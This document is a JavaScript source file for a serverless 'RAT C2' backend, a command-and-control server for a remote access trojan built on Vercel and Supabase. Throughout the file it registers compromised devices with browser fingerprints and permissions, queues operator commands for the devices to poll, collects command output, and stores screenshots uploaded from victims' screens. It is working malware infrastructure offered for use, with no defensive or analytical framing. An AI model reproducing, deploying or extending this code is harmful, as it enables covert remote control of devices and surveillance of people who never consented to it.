// ============================================================
//  RAT BACKEND — ALL ROUTES IN ONE FILE
//  For Vercel Hobby Plan (single function)
// ============================================================

const { createClient } = require('@supabase/supabase-js');

// ============================================================
//  SUPABASE CLIENT
// ============================================================
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_KEY || process.env.SUPABASE_ANON_KEY;

let supabase = null;
if (supabaseUrl && supabaseKey) {
    supabase = createClient(supabaseUrl, supabaseKey);
    console.log('[Boot] Supabase connected');
} else {
    console.log('[Boot] Supabase NOT configured');
}

// ============================================================
//  CORS HELPER
// ============================================================
function setCors(res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
}

// ============================================================
//  MAIN HANDLER
// ============================================================
module.exports = async (req, res) => {
    setCors(res);

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const url = new URL(req.url, `http://${req.headers.host}`);
    const path = url.pathname;

    console.log(`[${req.method}] ${path}`);

    // ============================================================
    //  ROOT — LANDING PAGE
    // ============================================================
    if (path === '/') {
        res.setHeader('Content-Type', 'text/html');
        return res.send(`<!DOCTYPE html>
<html>
<head><title>RAT C2</title>
<style>
body{background:#0a0a12;color:#e0e0e0;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;gap:16px;}
h1{color:#f7971e;}
a{color:#88ccff;text-decoration:none;}
</style>
</head>
<body>
<h1>☠️ RAT C2 Backend</h1>
<p>Server is running.</p>
<p>Status: ${supabase ? '✅ Database connected' : '❌ Database not configured'}</p>
</body>
</html>`);
    }

    // ============================================================
    //  HEALTH CHECK
    // ============================================================
    if (path === '/api/test') {
        return res.json({
            status: 'ok',
            supabase: supabase ? 'connected' : 'not configured',
            timestamp: new Date().toISOString()
        });
    }

    // ============================================================
    //  REGISTER DEVICE
    // ============================================================
    if (path === '/api/register' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { fingerprint, permissions } = req.body || {};
        if (!fingerprint) return res.status(400).json({ error: 'Missing fingerprint' });

        const deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);

        const { error } = await supabase
            .from('devices')
            .upsert([{
                id: deviceId,
                ip: fingerprint.ip || 'unknown',
                platform: fingerprint.platform || 'unknown',
                screen: fingerprint.screen || 'unknown',
                timezone: fingerprint.timezone || 'unknown',
                cpu_cores: fingerprint.cpuCores || 'unknown',
                memory: fingerprint.deviceMemory || 'unknown',
                canvas_fp: fingerprint.canvasFingerprint || 'unknown',
                first_seen: Date.now(),
                last_seen: Date.now(),
                status: 'active',
                permissions: JSON.stringify(permissions || {})
            }], { onConflict: 'id' });

        if (error) {
            console.error('Register error:', error);
            return res.status(500).json({ error: error.message });
        }

        await supabase.from('logs').insert([{
            device_id: deviceId,
            level: 'info',
            message: 'Device registered',
            timestamp: Date.now()
        }]);

        return res.json({ success: true, deviceId });
    }

    // ============================================================
    //  GET COMMANDS (for device to poll)
    // ============================================================
    if (path === '/api/commands' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });

        const { data, error } = await supabase
            .from('commands')
            .select('*')
            .eq('device_id', deviceId)
            .eq('status', 'pending')
            .order('sent_at', { ascending: true })
            .limit(10);

        if (error) {
            console.error('Commands error:', error);
            return res.status(500).json({ error: error.message });
        }

        if (data && data.length > 0) {
            const ids = data.map(c => c.id);
            await supabase
                .from('commands')
                .update({ status: 'sent' })
                .in('id', ids);
        }

        await supabase
            .from('devices')
            .update({ last_seen: Date.now() })
            .eq('id', deviceId);

        return res.json(data || []);
    }

    // ============================================================
    //  SEND COMMAND (from panel to device)
    // ============================================================
    if (path === '/api/send-command' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { deviceId, command } = req.body || {};
        if (!deviceId || !command) {
            return res.status(400).json({ error: 'Missing deviceId or command' });
        }

        const { data, error } = await supabase
            .from('commands')
            .insert([{
                device_id: deviceId,
                command: command,
                sent_at: Date.now(),
                status: 'pending'
            }])
            .select();

        if (error) {
            console.error('Send command error:', error);
            return res.status(500).json({ error: error.message });
        }

        await supabase.from('logs').insert([{
            device_id: deviceId,
            level: 'info',
            message: `Command sent: ${command}`,
            timestamp: Date.now()
        }]);

        return res.json({ success: true, commandId: data[0].id });
    }

    // ============================================================
    //  SUBMIT COMMAND RESULT (from device)
    // ============================================================
    if (path === '/api/submit-result' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { deviceId, commandId, output, error: cmdError } = req.body || {};
        if (!deviceId || !commandId) {
            return res.status(400).json({ error: 'Missing deviceId or commandId' });
        }

        const { error: updateError } = await supabase
            .from('commands')
            .update({
                status: cmdError ? 'failed' : 'executed',
                executed_at: Date.now()
            })
            .eq('id', commandId);

        if (updateError) {
            console.error('Update command error:', updateError);
            return res.status(500).json({ error: updateError.message });
        }

        const { error: insertError } = await supabase
            .from('results')
            .insert([{
                device_id: deviceId,
                command_id: commandId,
                output: output || '',
                error: cmdError || '',
                timestamp: Date.now()
            }]);

        if (insertError) {
            console.error('Insert result error:', insertError);
            return res.status(500).json({ error: insertError.message });
        }

        await supabase.from('logs').insert([{
            device_id: deviceId,
            level: cmdError ? 'error' : 'info',
            message: cmdError ? `Command failed: ${cmdError}` : 'Command executed successfully',
            timestamp: Date.now()
        }]);

        return res.json({ success: true });
    }

    // ============================================================
    //  UPLOAD SCREENSHOT
    // ============================================================
    if (path === '/api/screenshot' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { deviceId, image, timestamp } = req.body || {};
        if (!deviceId || !image) {
            return res.status(400).json({ error: 'Missing deviceId or image' });
        }

        try {
            let storagePath = null;
            let imageUrl = null;

            try {
                const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
                const ext = image.match(/^data:image\/(\w+);/)?.[1] || 'png';
                const fileName = `${deviceId}_${Date.now()}.${ext}`;
                const fileBuffer = Buffer.from(base64Data, 'base64');

                const { error: uploadError } = await supabase
                    .storage
                    .from('screenshots')
                    .upload(fileName, fileBuffer, {
                        contentType: `image/${ext}`,
                        cacheControl: '3600'
                    });

                if (!uploadError) {
                    storagePath = fileName;
                    const { data: urlData } = supabase.storage.from('screenshots').getPublicUrl(fileName);
                    imageUrl = urlData?.publicUrl || null;
                }
            } catch (e) {
                console.error('Storage error:', e);
            }

            const { error: dbError } = await supabase
                .from('screenshots')
                .insert([{
                    device_id: deviceId,
                    storage_path: storagePath,
                    image_url: imageUrl,
                    timestamp: timestamp || Date.now()
                }]);

            if (dbError) {
                console.error('DB error:', dbError);
                return res.status(500).json({ error: dbError.message });
            }

            await supabase.from('logs').insert([{
                device_id: deviceId,
                level: 'info',
                message: 'Screenshot uploaded',
                timestamp: Date.now()
            }]);

            return res.json({ success: true, imageUrl, storagePath });
        } catch (e) {
            console.error('Screenshot error:', e);
            return res.status(500).json({ error: e.message });
        }
    }

    // ============================================================
    //  GET ALL DEVICES (for panel)
    // ============================================================
    if (path === '/api/devices' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { data, error } = await supabase
            .from('devices')
            .select('*')
            .order('last_seen', { ascending: false });

        if (error) {
            console.error('Devices error:', error);
            return res.status(500).json({ error: error.message });
        }

        return res.json(data || []);
    }

    // ============================================================
    //  GET DEVICE DETAILS
    // ============================================================
    if (path === '/api/device-details' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });

        const [commands, results, logs, screenshots] = await Promise.all([
            supabase.from('commands').select('*').eq('device_id', deviceId).order('sent_at', { ascending: false }).limit(50),
            supabase.from('results').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(50),
            supabase.from('logs').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(100),
            supabase.from('screenshots').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(20)
        ]);

        return res.json({
            commands: commands.data || [],
            results: results.data || [],
            logs: logs.data || [],
            screenshots: screenshots.data || []
        });
    }

    // ============================================================
    //  ADD LOG
    // ============================================================
    if (path === '/api/log' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { deviceId, msg, level } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });

        const { error } = await supabase
            .from('logs')
            .insert([{
                device_id: deviceId,
                level: level || 'info',
                message: msg || '',
                timestamp: Date.now()
            }]);

        if (error) {
            console.error('Log error:', error);
            return res.status(500).json({ error: error.message });
        }

        return res.json({ success: true });
    }

    // ============================================================
    //  HEARTBEAT
    // ============================================================
    if (path === '/api/heartbeat' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { deviceId } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });

        await supabase
            .from('devices')
            .update({ last_seen: Date.now() })
            .eq('id', deviceId);

        return res.json({ success: true });
    }

    // ============================================================
    //  DELETE DEVICE
    // ============================================================
    if (path === '/api/delete-device' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { deviceId } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });

        const { error } = await supabase
            .from('devices')
            .delete()
            .eq('id', deviceId);

        if (error) {
            console.error('Delete error:', error);
            return res.status(500).json({ error: error.message });
        }

        return res.json({ success: true });
    }

    // ============================================================
    //  404
    // ============================================================
    return res.status(404).json({
        error: 'Not Found',
        path: path
    });
};